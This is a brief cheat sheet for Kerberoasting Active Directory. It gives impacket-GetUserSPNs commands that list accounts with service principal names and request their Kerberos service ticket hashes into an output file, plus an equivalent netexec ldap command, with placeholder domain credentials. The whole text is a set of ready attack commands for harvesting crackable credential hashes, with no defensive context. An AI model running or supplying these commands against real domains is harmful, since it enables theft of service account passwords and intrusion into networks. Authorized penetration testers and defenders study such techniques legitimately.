## show users with SPNs

impacket-GetUserSPNs domain/user:password

## save hashes

impacket-GetUserSPNs domain/user:password -outputfile hashes -request

or

netexec ldap dcip -u user -p password -d domain --kerberoasting KERBEROASTING